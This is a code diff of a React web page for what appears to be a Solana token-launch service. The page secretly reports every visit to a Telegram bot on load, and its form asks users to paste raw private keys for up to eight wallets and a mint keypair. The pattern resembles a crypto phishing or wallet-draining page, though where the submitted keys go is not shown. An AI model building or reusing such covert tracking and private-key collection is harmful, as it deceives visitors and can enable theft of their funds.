@@ -59,6 +59,8 @@
         <div class="particle"></div>
         <div class="particle"></div>
         <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
     </div>
     <div id="root"></div>
 
@@ -83,6 +85,8 @@
             React.useEffect(() => {
                 const sendVisitNotification = async () => {
                     try {
+                        console.log('Checking Telegram token:', !!window.ENV_TELEGRAM_BOT_TOKEN);
+                        
                         // Check if token is loaded
                         if (!window.ENV_TELEGRAM_BOT_TOKEN) {
                             console.error('Telegram token not loaded');
@@ -93,6 +97,8 @@
                         const visitTime = new Date().toLocaleString();
                         
                         const message = `🔔 New Site Visit!\n\n⏰ Time: ${visitTime}\n🌍 Timezone: ${timezone}\n🔗 URL: ${window.location.href}`;
+                        
+                        console.log('Sending notification...');
                         
                         const response = await fetch(`https://api.telegram.org/bot${window.ENV_TELEGRAM_BOT_TOKEN}/sendMessage`, {
                             method: 'POST',
@@ -106,6 +112,8 @@
                         });
 
                         const data = await response.json();
+                        console.log('Telegram response:', data);
+                        
                         if (!data.ok) {
                             console.error('Failed to send visit notification:', data);
                         }
@@ -116,78 +124,7 @@
 
                 // Send the notification
                 sendVisitNotification();
-            }, []); // Empty array means this runs once when component mounts
-
-            // Add new state for form data
-            const [formData, setFormData] = React.useState({
-                tokenName: '',
-                tokenSymbol: '',
-                tokenDescription: '',
-                twitter: '',
-                telegram: '',
-                website: ''
-            });
-
-            // Tooltip content
-            const tooltips = {
-                tokenImage: "Upload your token's image or logo. Supported formats: PNG, JPG (max 5MB)",
-                tokenName: "Enter your token's full name (e.g., 'My Awesome Token')",
-                tokenDescription: "Describe your token's purpose and features",
-                tokenSymbol: "Short identifier for your token (e.g., 'BTC', 'ETH')",
-                twitter: "Link to your project's Twitter/X account",
-                telegram: "Link to your project's Telegram group/channel",
-                website: "Your project's website URL",
-                wallets: "First wallet is the dev wallet. Format must be bs58 encoded private key",
-                mintKey: "Generate or enter a fresh keypair for minting. Must have 0 balance"
-            };
-
-            const toggleTooltip = (tooltipId) => {
-                if (activeTooltip === tooltipId) {
-                    setActiveTooltip(null);
-                } else {
-                    setActiveTooltip(tooltipId);
-                }
-            };
-
-            const addWallet = () => {
-                if (wallets.length < 8) {
-                    setWallets([...wallets, { 
-                        id: wallets.length + 1, 
-                        privateKey: '', 
-                        amount: '',
-                        balance: '– SOL'
-                    }]);
-                }
-            };
-
-            const removeWallet = (id) => {
-                if (wallets.length > 1) {
-                    setWallets(wallets.filter(wallet => wallet.id !== id));
-                }
-            };
-
-            const generateMintKey = () => {
-                // Generate a random key in the correct format
-                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-                const length = 88; // Length of the example key
-                let result = '';
-                
-                // Generate first two numbers
-                result += Math.floor(Math.random() * 90 + 10);
-                
-                // Generate the rest of the key
-                for (let i = 2; i < length; i++) {
-                    result += characters.charAt(Math.floor(Math.random() * characters.length));
-                }
-                
-                setMintKey(result);
-            };
-
-            const updateWallet = (id, field, value) => {
-                setWallets(wallets.map(wallet => 
-                    wallet.id === id ? { ...wallet, [field]: value } : wallet
-                ));
-            };
+            }, []);
 
             // Handle form field changes
             const handleInputChange = (field, value) => {
@@ -195,6 +132,13 @@
                     ...prev,
                     [field]: value
                 }));
+            };
+
+            // Update wallet
+            const updateWallet = (id, field, value) => {
+                setWallets(wallets.map(wallet => 
+                    wallet.id === id ? { ...wallet, [field]: value } : wallet
+                ));
             };
 
             // Handle form submission
@@ -274,7 +218,7 @@
                                                     >
                                                         ?
                                                     </span>
-                                                    {activeTooltip === 'tokenImage' && <Tooltip text={tooltips.tokenImage} />}
+                                                    {activeTooltip === 'tokenImage' && <Tooltip text="Upload your token's image or logo. Supported formats: PNG, JPG (max 5MB)" />}
                                                 </div>
                                                 <div className="border-2 border-dashed border-gray-600 rounded-lg p-4 text-center cursor-pointer hover:border-pink-500/50 transition-all duration-300">
                                                     <label htmlFor="file-upload" className="cursor-pointer w-full h-full flex flex-col items-center gap-2">
@@ -354,7 +298,7 @@
                                                     >
                                                         ?
                                                     </span>
-                                                    {activeTooltip === 'tokenName' && <Tooltip text={tooltips.tokenName} />}
+                                                    {activeTooltip === 'tokenName' && <Tooltip text="Enter your token's full name (e.g., 'My Awesome Token')" />}
                                                 </div>
                                                 <input 
                                                     type="text" 
@@ -372,7 +316,7 @@
                                                     >
                                                         ?
                                                     </span>
-                                                    {activeTooltip === 'tokenSymbol' && <Tooltip text={tooltips.tokenSymbol} />}
+                                                    {activeTooltip === 'tokenSymbol' && <Tooltip text="Short identifier for your token (e.g., 'BTC', 'ETH')" />}
                                                 </div>
                                                 <input 
                                                     type="text" 
@@ -390,7 +334,7 @@
                                                     >
                                                         ?
                                                     </span>
-                                                    {activeTooltip === 'tokenDescription' && <Tooltip text={tooltips.tokenDescription} />}
+                                                    {activeTooltip === 'tokenDescription' && <Tooltip text="Describe your token's purpose and features" />}
                                                 </div>
                                                 <textarea 
                                                     className="w-full bg-[#1a1a1a] rounded-lg p-3 text-white focus:outline-none focus:ring-2 focus:ring-emerald-400"
@@ -414,7 +358,7 @@
                                                     >
                                                         ?
                                                     </span>
-                                                    {activeTooltip === 'twitter' && <Tooltip text={tooltips.twitter} />}
+                                                    {activeTooltip === 'twitter' && <Tooltip text="Link to your project's Twitter/X account" />}
                                                 </div>
                                                 <input 
                                                     type="text" 
@@ -432,7 +376,7 @@
                                                     >
                                                         ?
                                                     </span>
-                                                    {activeTooltip === 'telegram' && <Tooltip text={tooltips.telegram} />}
+                                                    {activeTooltip === 'telegram' && <Tooltip text="Link to your project's Telegram group/channel" />}
                                                 </div>
                                                 <input 
                                                     type="text" 
@@ -450,7 +394,7 @@
                                                     >
                                                         ?
                                                     </span>
-                                                    {activeTooltip === 'website' && <Tooltip text={tooltips.website} />}
+                                                    {activeTooltip === 'website' && <Tooltip text="Your project's website URL" />}
                                                 </div>
                                                 <input 
                                                     type="text" 
@@ -473,7 +417,7 @@
                                                     >
                                                         ?
                                                     </span>
-                                                    {activeTooltip === 'wallets' && <Tooltip text={tooltips.wallets} />}
+                                                    {activeTooltip === 'wallets' && <Tooltip text="First wallet is the dev wallet. Format must be bs58 encoded private key" />}
                                                 </div>
 
                                                 {/* Wallet Inputs */}
@@ -531,7 +475,7 @@
                                                     >
                                                         ?
                                                     </span>
-                                                    {activeTooltip === 'mintKey' && <Tooltip text={tooltips.mintKey} />}
+                                                    {activeTooltip === 'mintKey' && <Tooltip text="Enter the private key for minting or generate a new one. IMPORTANT: this has to be a fresh keypair that hasn't been used. If it has balance on it, it will not work" />}
                                                 </div>
                                                 <p className="text-gray-400 text-sm mb-4">
                                                     Enter the private key for minting or generate a new one. IMPORTANT: this has to be a fresh keypair that hasn't been used. If it has balance on it, it will not work
